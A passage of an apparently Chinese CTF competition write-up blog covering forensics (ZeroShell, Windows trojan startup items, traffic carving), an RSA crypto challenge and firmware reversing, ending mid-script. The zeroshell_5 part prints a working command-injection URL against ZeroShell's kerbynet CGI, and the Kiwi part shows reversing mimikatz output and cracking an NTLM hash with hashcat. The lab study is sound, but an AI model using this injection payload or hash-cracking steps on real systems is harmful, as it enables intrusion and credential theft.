<h4 id="flag值：flag-202-115-89-103"><a href="#flag值：flag-202-115-89-103" class="headerlink" title="flag值：flag{202.115.89.103}"></a>flag值：flag{202.115.89.103}</h4><h3 id="zeroshell-4"><a href="#zeroshell-4" class="headerlink" title="zeroshell_4"></a>zeroshell_4</h3><h4 id="操作内容：-5"><a href="#操作内容：-5" class="headerlink" title="操作内容："></a>操作内容：</h4><p>直接找可执行文件像.sh或者.nginx这种使用命令（纯属狗运）</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find / -name <span class="string">&quot;.sh&quot;</span></span><br><span class="line">find / -name <span class="string">&quot;.nginx&quot;</span></span><br></pre></td></tr></table></figure>

<p>.sh文件没有，发现.nginx很多，尝试一下。</p>
<p><img src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1734255536063-1a717558-e34e-45c6-8137-15e22310808e.png"></p>
<p><img src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1734255493595-098e8f0f-ac24-4bd7-92ae-3ae65a5fda39.png"></p>
<h4 id="flag值：flag-nginx"><a href="#flag值：flag-nginx" class="headerlink" title="flag值：flag{.nginx}"></a>flag值：flag{.nginx}</h4><h3 id="zeroshell-5"><a href="#zeroshell-5" class="headerlink" title="zeroshell_5"></a>zeroshell_5</h3><h4 id="操作内容：-6"><a href="#操作内容：-6" class="headerlink" title="操作内容："></a>操作内容：</h4><p>本身是一个RCE的洞，可以直接远程下载，用wget</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget <span class="string">&quot;http://61.139.2.100/cgi-bin/kerbynet?Action=x509view&amp;Section=NoAuthREQ&amp;User=&amp;x509type=&#x27;%0A/etc/sudo%20tar%20-cf%20/dev/null%20/dev/null%20--checkpoint=1%20--checkpoint-action=exec=&#x27;cat%20/tmp/.nginx&#x27;%0A&#x27;&quot;</span></span><br></pre></td></tr></table></figure>

<p>然后直接把1.nginx dump下来，拉到ida，然后shift+f12直接找密钥了</p>
<p><img src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1734258209173-cf6ddf6c-146b-4ec5-b634-5c3d22861721.png"></p>
<h4 id="flag值：flag-11223344qweasdzxc"><a href="#flag值：flag-11223344qweasdzxc" class="headerlink" title="flag值：flag{11223344qweasdzxc}"></a>flag值：flag{11223344qweasdzxc}</h4><h3 id="zeroshell-6"><a href="#zeroshell-6" class="headerlink" title="zeroshell_6"></a>zeroshell_6</h3><h4 id="操作内容：-7"><a href="#操作内容：-7" class="headerlink" title="操作内容："></a>操作内容：</h4><p>题目说找到木马的启动项，直接ps -aux查看进程发现很多apache自带的进程，可疑的就几个，注意看这个进程</p>
<p><img src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1734257139492-e7ee1776-c490-4fa7-812d-161562288405.png"></p>
<p>一级一级网上找然后在system目录下面发现一个startup，太明显了</p>
<p><img src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1734257267579-7e227194-27c4-4019-98fa-62d20d76d438.png"></p>
<p>往startup下面一个个找也不多，然后找到最终地方</p>
<p><img src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1734257494761-24abf1fd-0abe-40b7-8df3-352649354548.png"></p>
<h4 id="flag值：flag-var-register-system-startup-scripts-nat-File"><a href="#flag值：flag-var-register-system-startup-scripts-nat-File" class="headerlink" title="flag值：flag{&#x2F;var&#x2F;register&#x2F;system&#x2F;startup&#x2F;scripts&#x2F;nat&#x2F;File}"></a>flag值：flag{&#x2F;var&#x2F;register&#x2F;system&#x2F;startup&#x2F;scripts&#x2F;nat&#x2F;File}</h4><h3 id="WinFT-1"><a href="#WinFT-1" class="headerlink" title="WinFT_1"></a>WinFT_1</h3><p>题目说找<font style="color:rgb(51, 51, 51);">受控机木马的回连域名及ip及端口，</font></p>
<p><font style="color:rgb(51, 51, 51);">直接看机器里面的第一个文件exe</font></p>
<p><img src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1734256758450-51cb147e-a210-4406-8eee-a538eb506649.png"></p>
<p>看见最后一个进程里面就有，得到flag</p>
<h4 id="flag值：flag-miscsecure-com-192-168-116-130-443"><a href="#flag值：flag-miscsecure-com-192-168-116-130-443" class="headerlink" title="flag值：flag{miscsecure.com:192.168.116.130:443}"></a>flag值：flag{miscsecure.com:192.168.116.130:443}</h4><h3 id="WinFT-2"><a href="#WinFT-2" class="headerlink" title="WinFT_2"></a>WinFT_2</h3><h4 id="操作内容：-8"><a href="#操作内容：-8" class="headerlink" title="操作内容："></a>操作内容：</h4><p>说是启动项里面的flag一开始还是去msconfig里面找的，结果不知道，一想肯定不是exe，然后去计划任务看，</p>
<p><img src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1734256529574-5efeae09-09d9-4682-af83-78f19a5f5f35.png"></p>
<p>然后放Cyberchef里面解出来。</p>
<p><img src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1734256580184-427aad8d-f506-4361-89c6-1aabbc723db8.png"></p>
<p>解出flag</p>
<h4 id="flag值：flag-AES-encryption-algorithm-is-an-excellent-encryption-algorithm"><a href="#flag值：flag-AES-encryption-algorithm-is-an-excellent-encryption-algorithm" class="headerlink" title="flag值：flag{AES_encryption_algorithm_is_an_excellent_encryption_algorithm}"></a>flag值：flag{AES_encryption_algorithm_is_an_excellent_encryption_algorithm}</h4><h3 id="WinFT-5"><a href="#WinFT-5" class="headerlink" title="WinFT_5"></a>WinFT_5</h3><h4 id="操作内容：-9"><a href="#操作内容：-9" class="headerlink" title="操作内容："></a>操作内容：</h4><p>直接把流量放kali里面，binwalk分析</p>
<p><img src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1734256097650-5877b9e6-a82b-429b-a9ac-77dc4f3bd2de.png"></p>
<p>发现位于22258409的偏移位置存在flag.txt</p>
<p><img src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1734256063587-994fde2d-4d28-45dd-a90e-507873d14fb5.png"></p>
<p>使用dd命令分离，提取出来</p>
<p><img src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1734256140314-b7fcd6eb-a369-4483-9d27-504a27c67f52.png"></p>
<p>发现需要密码，</p>
<p><img src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1734256198739-cc123602-8ac4-4b87-934e-5ee893ee000f.png"></p>
<p>然后把zip放0101里面，发现有东西，</p>
<p><img src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1734256225591-dfd62c07-8d10-4de0-befa-f3fd0a500736.png"></p>
<p>放到Cyberchef里面解出密码：时间线关联非常重要</p>
<p><img src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1734256317798-009103f2-dedd-49a0-a7e4-4740af32b70c.png"></p>
<p>解出flag</p>
<h4 id="flag值：flag-a1b2c3d4e5f67890abcdef1234567890-2f4d90a1b7c8e2349d3f56e0a9b01b8a-CBC"><a href="#flag值：flag-a1b2c3d4e5f67890abcdef1234567890-2f4d90a1b7c8e2349d3f56e0a9b01b8a-CBC" class="headerlink" title="flag值：flag{a1b2c3d4e5f67890abcdef1234567890-2f4d90a1b7c8e2349d3f56e0a9b01b8a-CBC}"></a>flag值：flag{a1b2c3d4e5f67890abcdef1234567890-2f4d90a1b7c8e2349d3f56e0a9b01b8a-CBC}</h4><h3 id="sc05-1"><a href="#sc05-1" class="headerlink" title="sc05_1"></a>sc05_1</h3><h4 id="操作内容：-10"><a href="#操作内容：-10" class="headerlink" title="操作内容："></a>操作内容：</h4><p>这个题直接打开execl，转到tcp-export的位置，直接找到时间</p>
<p><img src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1734255801863-aceced1b-dd05-48e7-a391-c610d339709d.png"></p>
<p>2024&#x2F;11&#x2F;09_16:22:42这是时间，MD5编码一下</p>
<p><img src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1734255881728-768bebb8-7819-4d93-bb9b-b80c6b6ab6b5.png"></p>
<p>得到flag{01DF5BC2388E287D4CC8F11EA4D31929}</p>
<h4 id="flag值：flag-01DF5BC2388E287D4CC8F11EA4D31929"><a href="#flag值：flag-01DF5BC2388E287D4CC8F11EA4D31929" class="headerlink" title="flag值：flag{01DF5BC2388E287D4CC8F11EA4D31929}"></a>flag值：flag{01DF5BC2388E287D4CC8F11EA4D31929}</h4><h3 id="Kiwi"><a href="#Kiwi" class="headerlink" title="Kiwi"></a>Kiwi</h3><h4 id="操作内容：-11"><a href="#操作内容：-11" class="headerlink" title="操作内容："></a>操作内容：</h4><p>exe直接拉ida之后，发现是个mimikatz程序，lsadump::lsa &#x2F;patch 是这个程序的命令参数，作用是导出lsa，目的就是找这个东西，所以本题的逻辑就是去逆这个玩意儿</p>
<p><img src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1734258362721-6662ba63-b6dd-475e-b674-388f0620dfcd.png"></p>
<p>主要看下面的几个函数，先看函数sub_140082974，先是对input有一步异或，异或的逻辑是初始化了一个变量v6，而v6的值可以通过变量unk_140111152中有一个获取，然后循环v5的次数，得到v6的值，就是一个伪随机数，然后得到的数再在下面做一个变表的base64</p>
<p><img src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1734258776865-c09227a8-a9dd-49ac-9cb0-5dffeafca433.png"></p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/44199706/1734258951669-cc94d02e-0104-4cc0-9e05-898871007ad4.png"></p>
<p>最后main里面的函数sub_140082774感觉就是一个将加密之后的结果上传的功能，然后给了流量包，那么去流量包里找密文即可</p>
<p><img src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1734259006581-53fccce5-80c0-4bf2-8e02-eb8798ae523a.png"></p>
<p>然后去看流量包，筛选一下http流量的upload流</p>
<p><img src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1734259093549-b40a73a7-146d-41dd-973a-44528ac750db.png"></p>
<p>然后发现三个包里的密文都是一样的</p>
<p><img src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1734259191720-a99bf4f0-e319-44c7-84ad-1faec919fb9a.png"></p>
<p>那么直接逆即可，懒得模拟随机数v6计算的过程，直接动调随机数种子就好了，然后直接解变表之后的数据即可</p>
<p><img src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1734259657974-e84fab7f-0bda-412a-a3fc-95a09a3a7fe3.png"></p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> temp[<span class="number">178</span>]=&#123;<span class="number">0xb9</span>,<span class="number">0x48</span>,<span class="number">0x1c</span>,<span class="number">0x58</span>,<span class="number">0x81</span>,<span class="number">0x4f</span>,<span class="number">0x51</span>,<span class="number">0x7d</span>,<span class="number">0x27</span>,<span class="number">0x70</span>,<span class="number">0x33</span>,<span class="number">0x6f</span>,<span class="number">0x79</span>,<span class="number">0x48</span>,<span class="number">0x82</span>,<span class="number">0x21</span>,<span class="number">0x08</span>,<span class="number">0x80</span>,<span class="number">0x79</span>,<span class="number">0x49</span>,<span class="number">0x51</span>,<span class="number">0x52</span>,<span class="number">0x28</span>,<span class="number">0x9b</span>,<span class="number">0x7d</span>,<span class="number">0xbb</span>,<span class="number">0x40</span>,<span class="number">0x67</span>,<span class="number">0x45</span>,<span class="number">0x7a</span>,<span class="number">0x96</span>,<span class="number">0x38</span>,<span class="number">0x3e</span>,<span class="number">0x7d</span>,<span class="number">0x41</span>,<span class="number">0x42</span>,<span class="number">0x86</span>,<span class="number">0x60</span>,<span class="number">0x4f</span>,<span class="number">0x6c</span>,<span class="number">0x3b</span>,<span class="number">0x87</span>,<span class="number">0x2e</span>,<span class="number">0x26</span>,<span class="number">0x72</span>,<span class="number">0x51</span>,<span class="number">0x83</span>,<span class="number">0x80</span>,<span class="number">0x79</span>,<span class="number">0xbd</span>,<span class="number">0x79</span>,<span class="number">0x40</span>,<span class="number">0x67</span>,<span class="number">0x71</span>,<span class="number">0x4a</span>,<span class="number">0xa2</span>,<span class="number">0x98</span>,<span class="number">0x76</span>,<span class="number">0x3a</span>,<span class="number">0x8f</span>,<span class="number">0x68</span>,<span class="number">0xda</span>,<span class="number">0x7f</span>,<span class="number">0x74</span>,<span class="number">0x2a</span>,<span class="number">0x33</span>,<span class="number">0x55</span>,<span class="number">0x8d</span>,<span class="number">0x5e</span>,<span class="number">0x2b</span>,<span class="number">0x39</span>,<span class="number">0x6d</span>,<span class="number">0xbe</span>,<span class="number">0x5f</span>,<span class="number">0x74</span>,<span class="number">0x74</span>,<span class="number">0x7d</span>,<span class="number">0x11</span>,<span class="number">0x8e</span>,<span class="number">0x4b</span>,<span class="number">0x4d</span>,<span class="number">0x99</span>,<span class="number">0x64</span>,<span class="number">0x79</span>,<span class="number">0x63</span>,<span class="number">0xb3</span>,<span class="number">0x73</span>,<span class="number">0xca</span>,<span class="number">0x31</span>,<span class="number">0x90</span>,<span class="number">0xc3</span>,<span class="number">0x77</span>,<span class="number">0x1b</span>,<span class="number">0x6f</span>,<span class="number">0x61</span>,<span class="number">0x52</span>,<span class="number">0x11</span>,<span class="number">0xbc</span>,<span class="number">0xbd</span>,<span class="number">0x86</span>,<span class="number">0xb2</span>,<span class="number">0x78</span>,<span class="number">0x4f</span>,<span class="number">0x7e</span>,<span class="number">0x56</span>,<span class="number">0x8f</span>,<span class="number">0x6c</span>,<span class="number">0x94</span>,<span class="number">0xb4</span>,<span class="number">0x3a</span>,<span class="number">0x7f</span>,<span class="number">0x14</span>,<span class="number">0x4b</span>,<span class="number">0x79</span>,<span class="number">0xb6</span>,<span class="number">0x8c</span>,<span class="number">0xb0</span>,<span class="number">0xad</span>,<span class="number">0x8b</span>,<span class="number">0x67</span>,<span class="number">0x6d</span>,<span class="number">0xd1</span>,<span class="number">0x7a</span>,<span class="number">0x9a</span>,<span class="number">0xa7</span>,<span class="number">0x31</span>,<span class="number">0x74</span>,<span class="number">0x25</span>,<span class="number">0x3e</span>,<span class="number">0x61</span>,<span class="number">0x2e</span>,<span class="number">0x82</span>,<span class="number">0x3d</span>,<span class="number">0x63</span>,<span class="number">0x5e</span>,<span class="number">0x77</span>,<span class="number">0x6b</span>,<span class="number">0x7c</span>,<span class="number">0x3f</span>,<span class="number">0x24</span>,<span class="number">0x65</span>,<span class="number">0x35</span>,<span class="number">0x9f</span>,<span class="number">0x53</span>,<span class="number">0x84</span>,<span class="number">0x92</span>,<span class="number">0x42</span>,<span class="number">0xa0</span>,<span class="number">0x7d</span>,<span class="number">0x66</span>,<span class="number">0x70</span>,<span class="number">0x3b</span>,<span class="number">0xd3</span>,<span class="number">0x65</span>,<span class="number">0xa2</span>,<span class="number">0x6d</span>,<span class="number">0x7f</span>,<span class="number">0x19</span>,<span class="number">0x92</span>,<span class="number">0x7a</span>,<span class="number">0x8c</span>,<span class="number">0xb8</span>,<span class="number">0x6b</span>,<span class="number">0x12</span>,<span class="number">0x18</span>,<span class="number">0x66</span>,<span class="number">0x74</span>,<span class="number">0xc0</span>,<span class="number">0x48</span>,<span class="number">0x64</span>,<span class="number">0x9d</span>,<span class="number">0x0e</span>,<span class="number">0x6f</span>,<span class="number">0x53</span>,<span class="number">0x96</span>,<span class="number">0x49</span>,<span class="number">0x61</span>,<span class="number">0x5d</span>&#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> bbq;</span><br><span class="line">    <span class="built_in">srand</span>(<span class="number">0x69</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">178</span>;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            bbq=temp[i]-(<span class="built_in">rand</span>()%<span class="number">128</span>);</span><br><span class="line"></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,bbq^<span class="number">0x69</span>&amp;<span class="number">0xff</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1734259729052-10f7bd56-12e9-4e80-8662-d5abb5eb6e4f.png"></p>
<p>然后直接把Lihua的NTLM去撞一下hash</p>
<p>直接上工具，得到密码</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m <span class="number">1000</span> -a <span class="number">0</span> --force <span class="number">23</span>d1e086b85cc18587bbc8c33adefe07 /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1734259884697-948511c4-8b1c-430b-bacb-ba6eb69c0c56.png"></p>
<h4 id="flag值：flag-memeallme"><a href="#flag值：flag-memeallme" class="headerlink" title="flag值：flag{memeallme!}"></a>flag值：flag{memeallme!}</h4><h2 id="密码学"><a href="#密码学" class="headerlink" title="密码学"></a><font style="color:black;">密码学</font></h2><h3 id="rasnd"><a href="#rasnd" class="headerlink" title="rasnd"></a>rasnd</h3><h4 id="操作内容：-12"><a href="#操作内容：-12" class="headerlink" title="操作内容："></a>操作内容：</h4><p><font style="color:rgb(51, 51, 51);">基本上和DownUnderCTF apbq rsa i一致，密码系统的漏洞在于$x_1,x_2$的位数太小了，我们可以对hint1和hint2两边分别乘上$x_2,x_1$，然后两式相减构造出因子$q$，这样一来我们就可以和模数$n$求gcd得到我们的p，q了，完整的推导过程如下</font></p>
<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/image-20241216091514431.png" alt="image-20241216091514431" data-caption="image-20241216091514431" loading="lazy"></p>
<p><font style="color:rgb(51, 51, 51);">第一段flag的脚本拿maple的改改就行了</font></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n1 = <span class="number">12041484248912643032281827138855623754144214035159379257661479163138740691775879744970066188895287834305299993544492956391792960896102848747030186725527727462894712060700333010084161232292945341786532686079371670477415860442278642697221340583569645588845014599550638325912186989334147835969874061056581067882184577796454285728001596032991576548616505694738258644347926711399658118922938510938119887205321934129700411659944514995029920532395752664247590123953777766329926456117538440392869407741390284440815213055049158646992117671363087867033230162348771385273345393144890080701361216495994574190386498448916311816797</span></span><br><span class="line">c1 = <span class="number">10606131316309955980934489999367845331927443863828583686141238316607269050684817039429298888781427841737522428868990033129396359422071583487650116153933235992772589074023014756603570826140692683719646462908402695451323182710065741160367461533107537946979392683247488668328727583897596393913788430745564403219132250771930726681544778750383056036694256341891369906160656846870749190113082284100872538571850988590168260190474932411452384081833324921809119609733433067883975638920071176430344363427978212930714208437515478915112319607619770956843101985777866969917968203033417800410149877887005212278008964025655987940957</span></span><br><span class="line">hint1 = <span class="number">1210163329385529229728939135743311954497267498380547164909234906003973611593798031761260290741249172090725684217414693693114449324670072882779106749063248097663867799443199777334875204112817022790357889479347171489446008099356250837065466918892616549927163255749494695158589358908509028746798132552909553239850862487264153570503905570515124883</span></span><br><span class="line">hint2 = <span class="number">5051204836955493115902299043864227023948832461277034652488258835184221521626345855566463934505556519381805282442109159775267806057755363491698274342564684351612127794982915561668169373789547317570427657539052251405041553056803632890416687608340386053780952769614333767097202054166611376586274576239144083005297435121927157297060690207800186682896326015350219721047026234504118337172881814255423542199000966155216738725842757720428244680380446841837035234700310983</span></span><br><span class="line">apbq1 = hint1 + <span class="number">0x114</span></span><br><span class="line">apbq2 = hint2 + <span class="number">0x514</span></span><br><span class="line"></span><br><span class="line">h1, h2 = apbq1, apbq2</span><br><span class="line"><span class="keyword">for</span> a1, a2 <span class="keyword">in</span> product(trange(<span class="number">2</span>**<span class="number">12</span>), repeat=<span class="number">2</span>):</span><br><span class="line">    q = gcd(a1*h1 - a2*h2, n1)</span><br><span class="line">    <span class="keyword">if</span> q != <span class="number">1</span> <span class="keyword">and</span> q&lt;n1:</span><br><span class="line">        <span class="built_in">print</span>(q,n1)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">q = <span class="number">114411205592246972220921230297242077940657645574270285474331214662896407392806621491630870605100409685745977685037681045756459767749822052290189670280723035164949944851395458359172624983161919320250363279972807380631771541310372109230847026234642522745139142418827828880645203931389076624693764995135409308641</span></span><br><span class="line">p = n1 // q</span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = invert(e, phi)</span><br><span class="line">flag = long_to_bytes(<span class="built_in">pow</span>(c1, d, n1))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<p>得到第一段flag：flag{d50d53cd-e2ce-</p>
<p><img src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1734262616067-a34129a9-b3b2-435d-af08-cbd217ac9c10.png"></p>
<p><font style="color:rgb(51, 51, 51);">第二部分就是一个有限域下的逆元，对hint求逆元我们可以得到两个等式</font></p>
<p>$ 514 * p - 114 * q &#x3D;&#x3D; x  \ p * q &#x3D;&#x3D; n $</p>
<p><font style="color:rgb(51, 51, 51);">直接z3解方程，脚本如下</font></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n2 = <span class="number">21626909171908453692251924387103943429444078378390804029791359086344901457614128315777353777946154715705188025455454883506581852192745448695330171712065848059085447176298338547611168540505303622649991647459241389851267706481741195973923366166350969428740106246575652922070364437283707248673414247015834408154336841845500174634585533145550612240655077795822499312831628265010867392272132327421316583927430144370227936025377802536431841460046560013098106494136549616711676888653891244666437683890387799042293066126208312839317392500611947692798756916972089791796065424069966139988959825520104626886407271566397598014479</span></span><br><span class="line">c2 = <span class="number">569516604779891642229626563202425917599205242605000009759024900334197676760498875709356073629224710968242118774272590035957794014944814569027666346273772760891740151661832004406395109811886627118507348575757378450205961170154177578337894121169344562117847542197369098179880407292635572736750972421301634710104680523760640958412310434786115630793487435865984193741176650867539434921286751815555011295375372628772142693142157388409831904845942568574027054385393890634270431602503271189772689768282466095937885481574735502991070696612305833770499878657295850059864341504403869711352220766605065553807072723398104147275</span></span><br><span class="line">hint = <span class="number">7354993101719521835942057560559580408743463323132751631614029356471066763586282676677888312943475827012461736138179904586928941942658362522899594590538632189792057377645275207357701819794899897630241261959366946307314047096789448491079019668061348270530520611478739108630519794038167843924690066067571126829134798676602734885527731532719971211866068475981470917729745697545742042055696088126726481101239997605997896836996320123720551222524217796125190116733813486368990126242621202368626320634775326774029367415577855148616903730121702683124218622095514962048699336270886055555358735126758449948884277874079744761833</span></span><br><span class="line"></span><br><span class="line">x = inverse(hint, n2)</span><br><span class="line"></span><br><span class="line">solver = Solver()</span><br><span class="line"></span><br><span class="line">p = Int(<span class="string">&#x27;p&#x27;</span>)</span><br><span class="line">q = Int(<span class="string">&#x27;q&#x27;</span>)</span><br><span class="line"></span><br><span class="line">solver.add(<span class="number">514</span> * p - <span class="number">114</span> * q == x)</span><br><span class="line">solver.add(p * q == n2)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> solver.check() == sat:</span><br><span class="line">    model = solver.model()</span><br><span class="line">    p_val = model[p].as_long()</span><br><span class="line">    q_val = model[q].as_long()</span><br><span class="line"></span><br><span class="line">    d = inverse(<span class="number">0x10001</span>, (p_val - <span class="number">1</span>) * (q_val - <span class="number">1</span>))</span><br><span class="line">    m = <span class="built_in">pow</span>(c2, d, n2)</span><br><span class="line">    <span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure>

<p><font style="color:rgb(51, 51, 51);">得到后一段flag：453b-b352-ab1385bd22af}</font></p>
<p><img src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1734262183738-3a7b4430-a25e-42d8-8c18-7a34a14d775a.png"></p>
<p><font style="color:rgb(51, 51, 51);">得到最终flag：</font></p>
<h4 id="flag值：flag-d50d53cd-e2ce-453b-b352-ab1385bd22af"><a href="#flag值：flag-d50d53cd-e2ce-453b-b352-ab1385bd22af" class="headerlink" title="flag值：flag{d50d53cd-e2ce-453b-b352-ab1385bd22af}"></a>flag值：flag{d50d53cd-e2ce-<font style="color:rgb(51, 51, 51);">453b-b352-ab1385bd22af}</font></h4><h2 id="逆向工程"><a href="#逆向工程" class="headerlink" title="逆向工程"></a><font style="color:black;">逆向工程</font></h2><h3 id="ezCsky"><a href="#ezCsky" class="headerlink" title="ezCsky"></a>ezCsky</h3><h4 id="操作内容：-13"><a href="#操作内容：-13" class="headerlink" title="操作内容："></a>操作内容：</h4><p>题目提示<font style="color:#000000;">使用了国产的交叉编译链对tbox的固件程序进行了编译，ida直接反编译的话会有一个异架构异常，网上搜一下，找到一篇参考文章</font><a target="_blank" rel="noopener" href="https://www.iotsec-zone.com/article/379">https://www.iotsec-zone.com/article/379</a>，然后直接用arm小端反编译，还是很难看</p>
<p><img src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1734255282688-430c1f40-6f47-43c2-955c-7dfbabd35833.png"></p>
<p>但是基本的加密逻辑能大概看出来，有RC4有异或unk_8AA0</p>
<p><img src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1734255382608-22e8dd73-9116-4882-89b0-d2ef79e6f687.png"></p>
<p>没办法调，这块儿fuzz了好久，密文肯定是无脑存unk_8AA0的，key是”testkey”，肯定是用于RC4的key是没得跑的，但是不知道有没有用这个还有异或的逻辑，后面一步步fuzz的，先解RC4再解xor，先xor再RC4，然后试探xor的逻辑选取常见的那几种，要不就是对上面的key的模取异或，要不就是经典的前一个等于前一个异或后一个，然后逆回去，最后fuzz了很久（雾）。。。。</p>
<p>最终的逆向逻辑是先无魔改RC4，然后走一个前后异或（从最后一个异或回去即可）</p>
<p><img src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1734256195424-1d25e77a-0db3-4a8c-a323-d6e711655927.png"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">key=<span class="string">&quot;testkey&quot;</span></span><br><span class="line"></span><br><span class="line">data=[<span class="number">0x0a</span>,<span class="number">0x0d</span>,<span class="number">0x06</span>,<span class="number">0x1c</span>,<span class="number">0x1f</span>,<span class="number">0x54</span>,<span class="number">0x56</span>,<span class="number">0x53</span>,<span class="number">0x57</span>,<span class="number">0x51</span>,<span class="number">0x00</span>,<span class="number">0x03</span>,<span class="number">0x1d</span>,<span 